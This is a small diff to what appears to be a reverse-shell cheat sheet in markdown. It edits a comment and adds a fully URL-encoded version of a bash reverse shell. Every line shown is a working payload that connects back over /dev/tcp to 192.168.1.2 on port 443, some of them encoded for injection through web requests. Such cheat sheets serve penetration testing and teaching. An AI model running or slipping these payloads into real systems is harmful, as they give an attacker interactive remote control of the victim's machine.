@@ -109,8 +109,9 @@ bash -i 5<> /dev/tcp/192.168.1.2/443 0<&5 1>&5 2>&5
 
 ```sh
 bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'
-#url encode
+#basic url encode
 bash -c 'bash -i >%26 /dev/tcp/192.168.1.2/443 0>%261'
+#full url encode
 bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%27
 ```
 <kbd>UDP</kbd>
